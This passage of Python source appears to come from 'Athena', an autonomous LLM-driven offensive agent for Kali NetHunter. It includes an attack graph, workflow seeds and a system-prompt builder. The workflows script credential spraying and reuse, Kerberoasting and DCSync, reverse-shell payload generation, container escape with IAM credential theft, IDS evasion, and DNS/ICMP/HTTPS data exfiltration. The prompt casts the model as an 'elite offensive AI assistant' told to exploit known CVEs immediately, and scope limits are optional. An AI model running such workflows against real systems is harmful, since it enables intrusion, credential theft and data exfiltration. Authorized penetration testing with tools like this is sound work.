            self.g.add_edge(vid, f"host:{host}", kind=self.EDGE_AFFECTS)

    def mark_cred_verified_on(self, cred_value: str, host: str, port: int):
        if not self._has():
            return
        cid = f"cred:{cred_value[:24]}"
        sid = f"svc:{host}:{port}"
        if cid in self.g and sid in self.g:
            self.g.add_edge(cid, sid, kind=self.EDGE_WORKS, verified=True)

    def auth_services(self) -> List[Tuple[str, int, str]]:
        """Return all auth-able services as (host, port, name)."""
        if not self._has():
            return []
        results = []
        AUTH_PORTS = {21, 22, 23, 80, 110, 143, 389, 443, 445, 1433, 1521,
                      3306, 3389, 5432, 5900, 5985, 5986, 6379, 8080, 8443,
                      9200, 27017}
        for nid, attrs in self.g.nodes(data=True):
            if attrs.get("kind") != self.NODE_SVC:
                continue
            port = attrs.get("port", 0)
            if port in AUTH_PORTS:
                # parse host from nid svc:HOST:PORT
                parts = nid.split(":")
                if len(parts) >= 3:
                    results.append((parts[1], port, attrs.get("label", "")))
        return results

    def cred_fanout_targets(self, cred_value: str) -> List[Tuple[str, int, str]]:
        """For a given credential, return services it hasn't been
        verified-tested against yet."""
        if not self._has():
            return []
        cid = f"cred:{cred_value[:24]}"
        if cid not in self.g:
            return []
        # Edges out of cid that are 'works_on' AND verified=True
        verified_against = set()
        for _, tgt, attrs in self.g.out_edges(cid, data=True):
            if attrs.get("kind") == self.EDGE_WORKS and attrs.get("verified"):
                verified_against.add(tgt)
        # All auth services minus already-verified
        targets = []
        for host, port, name in self.auth_services():
            sid = f"svc:{host}:{port}"
            if sid not in verified_against:
                targets.append((host, port, name))
        return targets

    def pivot_suggestions(self) -> List[str]:
        """Surface attack-graph queries the LLM should consider."""
        if not self._has():
            return []
        suggestions = []
        # Creds that have never been tested
        for nid, attrs in self.g.nodes(data=True):
            if attrs.get("kind") == self.NODE_CRED and not attrs.get("verified"):
                tested = sum(1 for _, _, e in self.g.out_edges(nid, data=True)
                             if e.get("kind") == self.EDGE_WORKS)
                if tested == 0:
                    suggestions.append(
                        f"Untested credential {attrs.get('label','?')} — "
                        f"try across {len(self.auth_services())} auth services")
        # Vulns without exploit attempt
        vulns = [a.get("label") for n, a in self.g.nodes(data=True)
                 if a.get("kind") == self.NODE_VULN]
        if vulns:
            suggestions.append(f"Known CVEs not yet exploited: {', '.join(vulns[:5])}")
        # Hashes without crack attempt
        hashes = [a.get("label") for n, a in self.g.nodes(data=True)
                  if a.get("kind") == self.NODE_HASH]
        if hashes:
            suggestions.append(f"{len(hashes)} hash(es) in queue — confirm cracking attempted")
        return suggestions

    def summary(self) -> str:
        if not self._has():
            return "Attack graph: networkx not installed (disabled)"
        counts = {}
        for _, attrs in self.g.nodes(data=True):
            k = attrs.get("kind", "unknown")
            counts[k] = counts.get(k, 0) + 1
        parts = [f"{v} {k}{'s' if v != 1 else ''}" for k, v in sorted(counts.items())]
        return f"Attack graph: {len(self.g.nodes)} nodes, {len(self.g.edges)} edges  ({', '.join(parts)})"

    def to_compact_text(self, max_chars: int = 1200) -> str:
        """Compact text representation for prompt injection on demand."""
        if not self._has():
            return "(graph disabled)"
        lines = [self.summary()]
        # Group hosts and their services
        hosts = [(n, a) for n, a in self.g.nodes(data=True)
                 if a.get("kind") == self.NODE_HOST]
        for hid, hattrs in hosts[:8]:
            ip = hattrs.get("label", "?")
            lines.append(f"  HOST {ip}:")
            # Services on this host
            svcs = []
            for src, dst, eattrs in self.g.in_edges(hid, data=True):
                if eattrs.get("kind") == self.EDGE_RUNS_ON:
                    sa = self.g.nodes[src]
                    svcs.append(sa.get("label", "?"))
            if svcs:
                lines.append(f"    services: {', '.join(svcs[:8])}")
        # Pivot suggestions
        sugg = self.pivot_suggestions()
        if sugg:
            lines.append("  PIVOT HINTS:")
            for s in sugg[:5]:
                lines.append(f"    - {s}")
        text = "\n".join(lines)
        return text[:max_chars] + ("..." if len(text) > max_chars else "")


# ═════════════════════════════════════════════════════════════════════
# CONTEXT MANAGER (v7.1) — token-saving smart context
#
# By default each turn ships a MINIMAL system prompt:
#   - active node only (not full PTT)
#   - verified findings (no unverified flood)
#   - last DEFAULT_HISTORY_SLICE turns (not full MAX_HISTORY_MESSAGES)
#   - role-filtered KB (already in v7.0)
#   - tool registry compact form
#
# When the LLM actually needs more, it emits [NEED]target[/NEED] and
# the agent loop re-fetches with that target attached and replays the
# turn.  Targets:
#   [NEED]ptt[/NEED]              full Pentesting Task Tree
#   [NEED]history[/NEED]          all 32 turns of history
#   [NEED]findings[/NEED]         verified + unverified findings
#   [NEED]graph[/NEED]            attack-graph compact text + pivots
#   [NEED]kb 5[/NEED]             specific KB section by number
#
# Auto-expansion triggers (no [NEED] required):
#   confidence in {yellow, red}  → expanded slice + ptt + graph
#   stuck_counter > 0            → expanded slice
#   new node entered             → ptt summary
# ═════════════════════════════════════════════════════════════════════

class ContextManager:
    """Decides what slice of state to send each turn.  Stateful so it
    can adapt based on confidence / stuck / new-node signals."""

    def __init__(self):
        self.last_node_id: Optional[str] = None
        self.recent_conf: str = "green"
        self.recent_stuck: int = 0
        self.tokens_saved_estimate: int = 0  # crude rolling estimate

    def signal_node_change(self, nid: Optional[str]):
        if nid != self.last_node_id:
            self.last_node_id = nid

    def signal_confidence(self, conf: str):
        self.recent_conf = conf

    def signal_stuck(self, n: int):
        self.recent_stuck = n

    def history_slice_size(self) -> int:
        """How many history turns to include this turn."""
        if self.recent_conf in ("yellow", "red"):
            return EXPANDED_HISTORY_SLICE
        if self.recent_stuck > 0:
            return EXPANDED_HISTORY_SLICE
        return DEFAULT_HISTORY_SLICE

    def should_attach_full_ptt(self) -> bool:
        return self.recent_conf in ("yellow", "red") or self.recent_stuck > 0

    def should_attach_graph(self) -> bool:
        return self.recent_conf in ("yellow", "red") or self.recent_stuck > 0

    @staticmethod
    def estimate_tokens(text: str) -> int:
        """Crude estimate: ~4 chars per token."""
        return max(1, len(text) // 4)

    def record_savings(self, full_size: int, sent_size: int):
        if full_size > sent_size:
            self.tokens_saved_estimate += (full_size - sent_size) // 4


# ═════════════════════════════════════════════════════════════════════
# WORKFLOWS — PTT seeders
#
# Each workflow now constructs an initial PTT for a given engagement
# type, instead of just being a fixed prompt.  Athena's loop then
# walks the tree, dispatching the right specialist per phase.
# ═════════════════════════════════════════════════════════════════════

WORKFLOWS = {

    "1": {
        "name": "Network Recon",
        "description": "ARP sweep → port scan → service detection → CVE correlation",
        "seed": [
            ("Host discovery (arp-scan / ping sweep)", "recon"),
            ("Top-port scan with version detection",   "recon"),
            ("Full TCP scan (-p-) for stragglers",     "recon"),
            ("OS fingerprint (-O / -A)",                "recon"),
            ("CVE correlation via searchsploit",        "recon"),
            ("Per-service deep enum (SMB/SSH/HTTP/etc)","network"),
        ],
    },

    "2": {
        "name": "Web Enumeration",
        "description": "Tech fingerprint → vuln scan → dir/vhost brute",
        "seed": [
            ("Tech fingerprint (whatweb -a 3 + headers)", "web"),
            ("Vulnerability scan (nikto + nuclei)",       "web"),
            ("Directory brute-force (feroxbuster)",       "web"),
            ("Sensitive files (robots.txt /.git /.env)",  "web"),
            ("Vhost enumeration",                          "web"),
            ("CVE correlation per technology",             "web"),
        ],
    },

    "3": {
        "name": "Linux Post-Exploitation",
        "description": "Identity → sudo → SUID → cron → caps → cred hunt",
        "seed": [
            ("Identity & system info (id/whoami/uname)",  "linux_privesc"),
            ("Sudo rights (sudo -l)",                      "linux_privesc"),
            ("SUID hunt (find -perm -4000)",               "linux_privesc"),
            ("Cron jobs (writable scripts?)",              "linux_privesc"),
            ("Capabilities (getcap -r /)",                 "linux_privesc"),
            ("Internal services (ss -tulnp)",              "linux_privesc"),
            ("Cred hunt (history/ssh keys/.env)",          "linux_privesc"),
            ("Kernel CVE check (linux-exploit-suggester)", "linux_privesc"),
        ],
    },

    "4": {
        "name": "Metasploit Exploit",
        "description": "Verify module → resource script → non-interactive run",
        "seed": [
            ("Verify exploit module exists",  "network"),
            ("Build .rc resource script",      "network"),
            ("Execute msfconsole -q -r",       "network"),
        ],
    },

    "5": {
        "name": "SQL Injection Assessment",
        "description": "Manual probe → sqlmap → dump → cred reuse",
        "seed": [
            ("Manual SQLi probe (' single quote test)", "web"),
            ("sqlmap auto-detect + --dbs",                "web"),
            ("Dump interesting tables",                    "web"),
            ("Extract credentials",                        "web"),
            ("Test extracted creds elsewhere",             "credential"),
        ],
    },

    "6": {
        "name": "Hash Cracking",
        "description": "Identify → cached check → wordlist → rules → mask",
        "seed": [
            ("Identify hash type (hashid)",     "credential"),
            ("Check hashcat --show cache",       "credential"),
            ("rockyou + best64 rules",           "credential"),
            ("Mask attack ?u?l?l?l?l?d?d?d",     "credential"),
        ],
    },

    "7": {
        "name": "Password Spraying",
        "description": "Service enum → policy check → spray → reuse",
        "seed": [
            ("Map auth services (SSH/SMB/RDP/web)", "recon"),
            ("Check password policy",                "ad"),
            ("Spray with lockout-aware timing",      "credential"),
            ("Cred reuse across all services",       "credential"),
        ],
    },

    "8": {
        "name": "Active Directory Recon & Attack",
        "description": "Anon enum → AS-REP → spray → Kerberoast → DCSync",
        "seed": [
            ("Anonymous SMB/LDAP enum",           "ad"),
            ("User list extraction (rpcclient/ldap)", "ad"),
            ("AS-REP roasting (no creds)",         "ad"),
            ("Crack AS-REP hashes",                "credential"),
            ("Authenticated enum (BloodHound)",    "ad"),
            ("Kerberoasting",                       "ad"),
            ("Crack TGS hashes",                   "credential"),
            ("ACL abuse / DCSync if possible",     "ad"),
        ],
    },

    "9": {
        "name": "Payload Generation & Listener",
        "description": "msfvenom payloads → handler resource script",
        "seed": [
            ("Get LHOST",                           "exfil"),
            ("Generate Windows x64 reverse_tcp",    "exfil"),
            ("Generate Linux x64 reverse_tcp",      "exfil"),
            ("Generate PHP/JSP/ASPX as needed",     "exfil"),
            ("Build multi/handler .rc + launch",    "network"),
        ],
    },

    "10": {
        "name": "Bluetooth Recon",
        "description": "Interface check → classic + LE scan → service browse",
        "seed": [
            ("hciconfig -a interface check",  "recon"),
            ("hcitool scan (classic)",        "recon"),
            ("hcitool lescan (BLE)",          "recon"),
            ("sdptool browse per device",     "recon"),
        ],
    },

    "11": {
        "name": "OSINT Profiling",
        "description": "whois → DNS → certs → harvester → subdomains",
        "seed": [
            ("whois + DNS records",              "recon"),
            ("Certificate transparency (crt.sh)", "recon"),
            ("theHarvester multi-source",         "recon"),
            ("Subdomain enum (subfinder/amass)",  "recon"),
            ("Probe live subdomains (httpx)",     "web"),
            ("Public github/breach data",         "recon"),
        ],
    },

    "12": {
        "name": "SSL/TLS Audit",
        "description": "sslscan → testssl → cipher review",
        "seed": [
            ("sslscan quick cipher list",  "web"),
            ("testssl.sh full audit",       "web"),
            ("Review weak ciphers/protocols","web"),
            ("Check Heartbleed/POODLE/etc", "web"),
        ],
    },

    "13": {
        "name": "DNS Enumeration",
        "description": "dnsrecon → zone transfer → fierce → resolver checks",
        "seed": [
            ("dnsrecon standard records",   "recon"),
            ("Zone transfer attempt",        "recon"),
            ("fierce subdomain brute",       "recon"),
            ("Open resolver check",          "recon"),
        ],
    },

    "14": {
        "name": "SMB Attack Chain",
        "description": "ms17-010 check → enum → share → relay → SAM",
        "seed": [
            ("ms17-010 / cve-2020-0796 check", "network"),
            ("Anonymous share list",            "network"),
            ("nxc smb --shares",                "network"),
            ("enum4linux full",                 "ad"),
            ("Signing check (relay candidate)", "ad"),
            ("If creds: SAM dump",              "ad"),
        ],
    },

    "15": {
        "name": "API Security Testing",
        "description": "Discovery → params → auth bypass → IDOR → JWT",
        "seed": [
            ("Endpoint discovery (ffuf)",        "web"),
            ("Hidden parameters (arjun)",        "web"),
            ("Auth bypass (no-token requests)",  "web"),
            ("IDOR (numeric ID manipulation)",   "web"),
            ("JWT decode + alg:none + brute",    "web"),
            ("SSRF via URL params",              "web"),
        ],
    },

    "16": {
        "name": "Linux Privilege Escalation",
        "description": "linpeas → GTFOBins → kernel → docker/lxd",
        "seed": [
            ("Quick wins (id/sudo -l/SUID)",  "linux_privesc"),
            ("linpeas full sweep",            "linux_privesc"),
            ("kernel exploit-suggester",      "linux_privesc"),
            ("docker/lxd group check",        "linux_privesc"),
            ("Capabilities deep dive",        "linux_privesc"),
        ],
    },

    "17": {
        "name": "Windows Privilege Escalation",
        "description": "winpeas → tokens → service ACL → AlwaysInstallElevated",
        "seed": [
            ("whoami /priv & /groups",          "windows_privesc"),
            ("systeminfo + wesng",              "windows_privesc"),
            ("Unquoted service paths",          "windows_privesc"),
            ("AlwaysInstallElevated check",     "windows_privesc"),
            ("Stored creds (cmdkey/reg)",       "windows_privesc"),
            ("PrintSpoofer/GodPotato if SeImp", "windows_privesc"),
        ],
    },

    "18": {
        "name": "Lateral Movement",
        "description": "PTH → wmiexec → DCSync → pivot tunnels",
        "seed": [
            ("Cred/hash inventory",       "credential"),
            ("nxc smb host sweep",         "ad"),
            ("psexec / wmiexec / smbexec","ad"),
            ("Kerberos ticket usage",     "ad"),
            ("DCSync if DA",              "ad"),
            ("Pivot tunnels (chisel/ligolo)","exfil"),
        ],
    },

    "19": {
        "name": "Container & Cloud Escape",
        "description": "Container detect → docker socket → metadata → IAM",
        "seed": [
            ("Detect container (cgroup/.dockerenv)", "linux_privesc"),
            ("docker.sock check",                     "linux_privesc"),
            ("Container escape via socket",          "linux_privesc"),
            ("AWS IMDS metadata",                     "exfil"),
            ("IAM credential extraction",             "exfil"),
            ("kubectl auth can-i --list",             "exfil"),
        ],
    },

    "20": {
        "name": "IDS/IPS Evasion",
        "description": "MAC spoof → fragment → decoy → timing → source-port",
        "seed": [
            ("MAC spoof (macchanger)",   "evasion"),
            ("Slow scan -T1 --scan-delay","evasion"),
            ("Fragment -f --mtu 8",       "evasion"),
            ("Decoys -D RND:15",          "evasion"),
            ("Source-port 53 mimic DNS",  "evasion"),
        ],
    },

    "21": {
        "name": "Data Exfiltration",
        "description": "Channel test → HTTPS → DNS → ICMP fallbacks",
        "seed": [
            ("Outbound test (HTTPS to ifconfig.me)", "exfil"),
            ("HTTPS POST exfil",                      "exfil"),
            ("DNS exfil (base64-fold-nslookup)",      "exfil"),
            ("ICMP exfil (ping -p)",                  "exfil"),
        ],
    },

    "22": {
        "name": "Forensics & Evidence",
        "description": "Hash → strings → binwalk → volatility",
        "seed": [
            ("Integrity hash (sha256sum)",    "recon"),
            ("file + strings inspection",      "recon"),
            ("binwalk for embedded data",      "recon"),
            ("volatility memory analysis",     "recon"),
        ],
    },

    "23": {
        "name": "Steganography",
        "description": "Metadata → strings → steghide → zsteg → binwalk",
        "seed": [
            ("file confirms type",         "recon"),
            ("exiftool metadata",           "recon"),
            ("strings + grep flag/key",     "recon"),
            ("steghide -p '' (no pass)",    "recon"),
            ("zsteg -a (PNG/BMP)",          "recon"),
            ("binwalk -e extraction",       "recon"),
        ],
    },
}


# ═════════════════════════════════════════════════════════════════════
# CORE RULES embedded in every system prompt
# ═════════════════════════════════════════════════════════════════════

CORE_RULES = (
    "OUTPUT FORMAT (STRICT — emit ONE of either form):\n"
    "  [THOUGHT]<reasoning>[/THOUGHT]\n"
    "  EITHER (preferred for known tools):\n"
    "    [TOOL]<tool_name>[/TOOL][ARGS]<json object of args>[/ARGS]\n"
    "  OR (for ad-hoc commands not in the tool registry):\n"
    "    [CMD]<one shell command, non-interactive>[/CMD]\n"
    "  [CONF]<green|yellow|red>[/CONF]\n"
    "  Optional: [VERIFY]<command to verify a finding>[/VERIFY]\n"
    "  Optional: [HANDOFF]<other agent role>[/HANDOFF]\n"
    "  Optional: [NEED]<ptt|history|findings|graph|kb N>[/NEED]\n"
    "    Use [NEED] when you require more state than the minimal context\n"
    "    provided.  The system will re-call you with that data attached.\n"
    "    Examples: [NEED]ptt[/NEED]   [NEED]graph[/NEED]   [NEED]kb 4[/NEED]\n"
    "\n"
    "TOOL FORMAT EXAMPLES:\n"
    '  [TOOL]nmap[/TOOL][ARGS]{"target":"10.0.0.5","top_ports":1000,"version":true}[/ARGS]\n'
    '  [TOOL]gobuster_dir[/TOOL][ARGS]{"url":"http://10.0.0.5","wordlist":"/usr/share/wordlists/dirb/common.txt"}[/ARGS]\n'
    '  [TOOL]hydra[/TOOL][ARGS]{"target":"10.0.0.5","service":"ssh","userlist":"/tmp/u.txt","passlist":"/tmp/p.txt"}[/ARGS]\n'
    '  [TOOL]searchsploit[/TOOL][ARGS]{"query":"vsftpd 2.3.4"}[/ARGS]\n'
    "\n"
    "WHEN TO USE [TOOL] vs [CMD]:\n"
    " - [TOOL] for any tool listed in the registry — guarantees flag correctness.\n"
    " - [CMD] for: custom curl payloads, one-off pipes (nmap | grep | awk),\n"
    "   sed/awk parsing, manual SQL probes, anything not in the registry.\n"
    "\n"
    "RULES:\n"
    " - Never repeat a command verbatim.\n"
    " - Never run apt upgrade or interactive shells (msfconsole/ssh/nano/vim/mysql).\n"
    " - msfconsole MUST use -q -r /tmp/x.rc (last line of rc = exit).\n"
    " - Never invent MSF modules — use only those in S11 KB.\n"
    " - Always pivot from existing findings before scanning fresh.\n"
    " - When CVE is known, exploit it immediately, don't keep enumerating.\n"
    " - WORKFLOW_COMPLETE in [CMD] when current node is done.\n"
    " - CONF green = high confidence direct attack.\n"
    " - CONF yellow = uncertain, propose pivot.\n"
    " - CONF red = need more info before any command.\n"
    " - Cite CVSS/CVE numbers in [THOUGHT] where relevant.\n"
    " - Reason from real subprocess output only — not from prior assumptions."
)


def build_system_prompt(agent_role: str,
                        target_info: Dict[str, Any],
                        ptt: PTT,
                        active_node: Optional[PTTNode],
                        lhost: str,
                        workflow_key: Optional[str] = None,
                        free_form: str = "",
                        context_mgr: Optional["ContextManager"] = None,
                        graph: Optional["AttackGraph"] = None,
                        scope: Optional["ScopeConfig"] = None,
                        force_full: bool = False,
                        need_attachments: Optional[List[str]] = None) -> str:
    """Compose system prompt for the chosen specialist agent.

    v7.1 — minimal context by default, expanded on demand.
    Includes: agent persona + extra rules + KB sections + active node +
    findings summary + Kali tool registry summary + structured tool
    registry + core rules.  When force_full=True or [NEED] tags trigger,
    extra context is attached.
    """
    spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])
    need_attachments = need_attachments or []

    # Decide expansion level
    expand_ptt   = force_full or "ptt" in need_attachments
    expand_finds = force_full or "findings" in need_attachments
    expand_graph = force_full or "graph" in need_attachments
    if context_mgr:
        if context_mgr.should_attach_full_ptt():
            expand_ptt = True
        if context_mgr.should_attach_graph():
            expand_graph = True

    # Target block
    target_parts = []
    if target_info.get("ip"):
        target_parts.append(f"Target: {target_info['ip']}")
    if target_info.get("domain"):
        target_parts.append(f"Domain: {target_info['domain']}")
    if target_info.get("notes"):
        target_parts.append(f"Mission: {target_info['notes']}")
    target_block = " | ".join(target_parts) if target_parts else "No target set"

    # Active node context (always present, even in minimal mode)
    node_block = ""
    if active_node:
        node_block = (
            f"CURRENT NODE: [{active_node.nid}] {active_node.title} "
            f"(phase={active_node.phase}, status={active_node.status}, "
            f"attempts={active_node.attempts}, conf={active_node.confidence})"
        )
        if active_node.last_cmd:
            node_block += f"\n  last_cmd: {active_node.last_cmd}"

    # Findings summary — minimal (verified counts) by default
    verified = ptt.get_verified()
    unverified = ptt.get_unverified()

    findings_block = ""
    if expand_finds:
        # Full dump — verified + unverified
        if verified or unverified:
            findings_block = "FINDINGS (FULL):\n"
            if verified:
                v_dict: Dict[str, List[str]] = {}
                for f in verified:
                    v_dict.setdefault(f.ftype, []).append(f.value)
                findings_block += "  VERIFIED:\n"
                for k, vs in v_dict.items():
                    findings_block += f"    {k}: {', '.join(vs[-10:])}\n"
            if unverified:
                u_dict: Dict[str, List[str]] = {}
                for f in unverified:
                    u_dict.setdefault(f.ftype, []).append(f.value)
                findings_block += "  UNVERIFIED (treat as candidates only):\n"
                for k, vs in u_dict.items():
                    findings_block += f"    {k}: {', '.join(vs[-10:])}\n"
    else:
        # Compact — verified only, last 4 per type
        if verified:
            v_dict_c: Dict[str, List[str]] = {}
            for f in verified:
                v_dict_c.setdefault(f.ftype, []).append(f.value)
            findings_block = "VERIFIED FINDINGS:\n"
            for k, vs in v_dict_c.items():
                findings_block += f"  {k}: {', '.join(vs[-4:])}\n"
        if unverified:
            findings_block += f"  ({len(unverified)} unverified — request [NEED]findings[/NEED] if relevant)\n"

    # PTT — minimal (just current branch) or full
    if expand_ptt:
        ptt_block = ptt.to_natural_language(max_chars=2000)
    elif active_node:
        # Just show current node + immediate siblings + parent
        nodes_to_show = {active_node.nid}
        if active_node.parent_id:
            nodes_to_show.add(active_node.parent_id)
            parent = ptt.nodes.get(active_node.parent_id)
            if parent:
                for sib in parent.children:
                    nodes_to_show.add(sib)
        ptt_block_lines = ["PTT (current branch only — request [NEED]ptt[/NEED] for full tree):"]
        for nid in sorted(nodes_to_show):
            n = ptt.nodes.get(nid)
            if n:
                glyph = ptt.STATUS_GLYPH.get(n.status, "?")
                ptt_block_lines.append(f"  {glyph} [{n.nid}] {n.title} ({n.status})")
        ptt_block = "\n".join(ptt_block_lines)
    else:
        ptt_block = "PTT: (empty — set a target first)"

    # Skip directives derived from findings
    skip = []
    fdict = ptt.findings_by_type_dict()
    if fdict.get("port"):
        skip.append("ports already known — skip discovery")
    if fdict.get("ip") and len(fdict["ip"]) > 1:
        skip.append("hosts already known — skip ping sweep")
    if fdict.get("svc"):
        skip.append("services fingerprinted — skip banner grab")
    if fdict.get("user"):
        skip.append("USE known users for spray")
    if fdict.get("cred"):
        skip.append("TEST creds across all services NOW")
    if fdict.get("hash") or fdict.get("hash_ntlm") or fdict.get("krb_hash"):
        skip.append("QUEUE hashes for cracking")
    if fdict.get("cve"):
        skip.append("EXPLOIT known CVEs first")
    skip_block = ""
    if skip:
        skip_block = "PIVOT DIRECTIVES: " + " | ".join(skip)

    # Attack graph block
    graph_block = ""
    if expand_graph and graph is not None:
        graph_block = "ATTACK GRAPH STATE:\n" + graph.to_compact_text(max_chars=1200)
    elif graph is not None:
        graph_block = f"GRAPH: {graph.summary()}  (request [NEED]graph[/NEED] for paths)"

    # Knowledge base — agent-aware
    kb_text = get_kb_sections(workflow_key=workflow_key,
                              prompt_text=free_form,
                              agent_role=agent_role)

    # Apply [NEED]kb N[/NEED] requests
    for att in need_attachments:
        if att.startswith("kb "):
            try:
                num = int(att.split()[1])
                if num in KB:
                    kb_text += "\n\n" + KB[num]
            except (ValueError, IndexError):
                pass

    # Kali tools available (compact)
    tools_block = kali_tool_summary_for_prompt()

    # NEW: structured tool registry for [TOOL]/[ARGS] format
    structured_block = tool_registry_for_prompt()

    # Scope reminder
    scope_block = ""
    if scope and scope.enabled:
        scope_block = "⚠ ENGAGEMENT SCOPE ENFORCED — out-of-scope commands will be refused."

    parts = [
        f"You are Athena, an elite offensive AI assistant on Kali NetHunter.",
        f"Operator: The Priest.  Your LHOST: {lhost}",
        "",
        f"=== ACTIVE AGENT: {spec['icon']} {spec['name']} ===",
        spec["persona"],
        spec["extra_rules"],
        "",
        target_block,
    ]
    if scope_block:
        parts.append(scope_block)
    if node_block:
        parts.append(node_block)
    if findings_block:
        parts.append(findings_block.strip())
    if skip_block:
        parts.append(skip_block)
    parts.append(ptt_block)
    if graph_block:
        parts.append(graph_block)
    parts.append(structured_block)
    parts.append(tools_block)
    parts.append("KNOWLEDGE BASE:\n" + kb_text)
    parts.append(CORE_RULES)
    return "\n\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# RESPONSE PARSING
# ═════════════════════════════════════════════════════════════════════

def parse_specialist_response(text: str) -> Dict[str, Any]:
    """Extract THOUGHT / CMD / TOOL / ARGS / CONF / VERIFY / HANDOFF /
    NEED from model output.  v7.1: TOOL/ARGS/NEED added."""
    out = {
        "thought":  "",
        "cmd":      None,
        "tool":     None,        # v7.1
        "args":     None,        # v7.1
        "conf":     "green",
        "verify":   None,
        "handoff":  None,
        "need":     [],          # v7.1 — list of attachment requests
    }
    if not text:
        return out

    t = re.search(r'\[THOUGHT\](.*?)\[/?THOUGHT\]', text, re.DOTALL | re.IGNORECASE)
    if t:
        out["thought"] = t.group(1).strip()

    c = re.search(r'\[CMD\](.*?)\[/?CMD\]', text, re.DOTALL | re.IGNORECASE)
    if c:
        out["cmd"] = c.group(1).strip()

    # v7.1 — structured tool dispatch
    tool_m = re.search(r'\[TOOL\]\s*([\w_]+)\s*\[/?TOOL\]', text, re.IGNORECASE)
    if tool_m:
        out["tool"] = tool_m.group(1).strip()
    args_m = re.search(r'\[ARGS\](.*?)\[/?ARGS\]', text, re.DOTALL | re.IGNORECASE)
    if args_m:
        out["args"] = args_m.group(1).strip()

    cf = re.search(r'\[CONF\]\s*(green|yellow|red)\s*\[/?CONF\]',
                   text, re.IGNORECASE)
    if cf:
        out["conf"] = cf.group(1).lower()

    v = re.search(r'\[VERIFY\](.*?)\[/?VERIFY\]', text, re.DOTALL | re.IGNORECASE)
    if v:
        out["verify"] = v.group(1).strip()

    h = re.search(r'\[HANDOFF\]\s*(\w+)\s*\[/?HANDOFF\]', text, re.IGNORECASE)
    if h:
        out["handoff"] = h.group(1).strip().lower()

    # v7.1 — multiple [NEED] tags allowed in one response
    needs = re.findall(r'\[NEED\]\s*([^\[\]]+?)\s*\[/?NEED\]', text, re.IGNORECASE)
    if needs:
        # Normalise: lowercase, trim, dedup
        seen = set()
        for n in needs:
            n_clean = n.strip().lower()
            if n_clean and n_clean not in seen:
                seen.add(n_clean)
                out["need"].append(n_clean)

    return out


# ═════════════════════════════════════════════════════════════════════
# ATHENA SESSION
# ═════════════════════════════════════════════════════════════════════

class AthenaSession:

    def __init__(self):
        self.target_info: Dict[str, Any] = {}
        self.lhost = "127.0.0.1"
        self.logfile = None
        self.session_start = datetime.datetime.now()
        self.history: List[Dict[str, str]] = []
        self.command_history: List[str] = []
        self.stuck_counter = 0
        self.tools_available: Dict[str, bool] = {}
        self.current_workflow_key: Optional[str] = None
        self.current_agent: str = "recon"

        # PTT replaces the flat findings dict.
        self.ptt = PTT(goal="Mission undefined")

        # v7.1 — scope, attack graph, context manager
        self.scope = ScopeConfig.load()
        self.graph = AttackGraph()
        self.context_mgr = ContextManager()

        # v7.1 — credential fanout queue (creds awaiting service tests)
        self.cred_fanout_queue: List[Tuple[str, str]] = []  # (cred_value, user)

        # v7.1 — track ATT&CK techniques exercised this session
        self.attack_techniques_used: Dict[str, Dict[str, Any]] = {}

        # Provider state
        self.provider_index = 0
        self.groq_client: Optional[Groq] = None

        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs(LOG_DIR, exist_ok=True)

        self._init_provider()
        self._start_log()
        self._run_boot_check()
        self.lhost = get_lhost()
        ensure_rockyou()

    # ── Provider init ─────────────────────────────────────────────

    def _init_provider(self):
        groq_key = os.environ.get("GROQ_API_KEY")
        if not groq_key:
            print(
                "\n\033[31m   FATAL: GROQ_API_KEY not set.\033[0m\n"
                "   Add to ~/.bashrc:  export GROQ_API_KEY='your_key'\n"
                "   Then: source ~/.bashrc\n"
            )
            sys.exit(1)
        try:
            self.groq_client = Groq(api_key=groq_key)
        except Exception as e:
            print(f"\033[31m   FATAL: Groq init: {e}\033[0m")
            sys.exit(1)
        first = PROVIDER_CHAIN[0]
        print(f"\033[32m   ✅ Groq client OK\033[0m")
        print(f"\033[32m   Active model: {first[1]}\033[0m")

    # ── Logging ───────────────────────────────────────────────────

    def _start_log(self):
        ts = self.session_start.strftime("%Y%m%d_%H%M%S")
        log_path = os.path.join(LOG_DIR, f"session_{ts}.txt")
        try:
            self.logfile = open(log_path, "w")
            self.logfile.write(
                f"ATHENA v{VERSION} LOG\n"
                f"Started: {self.session_start.isoformat()}\n"
                f"{'='*64}\n\n"
            )
            self.logfile.flush()
            print(f"\033[90m   Log: {log_path}\033[0m")
        except Exception as e:
            print(f"\033[33m   Log open failed: {e}\033[0m")

    def _log(self, text: str):
        if self.logfile:
            try:
                clean = re.sub(r'\033\[[0-9;]*m', '', text)
                self.logfile.write(clean + "\n")
                self.logfile.flush()
            except Exception:
                pass

    def _run_boot_check(self):
        # v7.2 — auto-expire the boot lock after BOOT_LOCK_TTL_SECONDS
        try:
            if os.path.exists(BOOT_LOCK):
                age = time.time() - os.path.getmtime(BOOT_LOCK)
                if age < BOOT_LOCK_TTL_SECONDS:
                    return
        except Exception:
            pass

        print()
        say_athena("Boot check…")

        # Pull upgradable list (best-effort; non-fatal if apt unavailable)
        try:
            result = subprocess.run(
                "apt list --upgradable 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=15
            )
            upgrades = result.stdout.lower()
        except Exception:
            upgrades = ""

        # v7.2 — only flag a UI-package upgrade as a "threat" if the
        # package is ACTUALLY INSTALLED on this system.  Substring
        # matching alone produces false positives like 'xfce' matching
        # 'xfce4-something' on a phone where xfce was never installed.
        confirmed_threats: List[str] = []
        for p in BANNED_UPGRADE_PACKAGES:
            if p not in upgrades:
                continue
            try:
                # dpkg-query returns rc 0 when at least one matching
                # package is installed (state starts with 'i').
                check = subprocess.run(
                    f"dpkg-query -W -f='${{Status}}\\n' '{p}*' 2>/dev/null "
                    f"| grep -q '^install ok installed'",
                    shell=True, timeout=5
                )
                if check.returncode == 0:
                    confirmed_threats.append(p)
            except Exception:
                # If dpkg-query failed for some reason, be conservative
                # and DON'T flag — better than false alarms.
                continue

        if confirmed_threats:
            say_warn(f"UI threat blocked: {', '.join(confirmed_threats)} "
                     f"have upgrades pending — apt upgrade is banned.")
        else:
            say_ok("System OK")

        try:
            with open(BOOT_LOCK, "w") as f:
                f.write(f"ok {datetime.datetime.now().isoformat()}")
        except Exception:
            pass

    # ── Provider call & fallback chain ────────────────────────────

    def _call_provider(self, messages: list, model: str,
                       max_tokens: int = MAX_TOKENS_DEFAULT) -> str:
        completion = self.groq_client.chat.completions.create(
            model=model,
            messages=messages,
            temperature=0.2,
            max_tokens=max_tokens,
        )
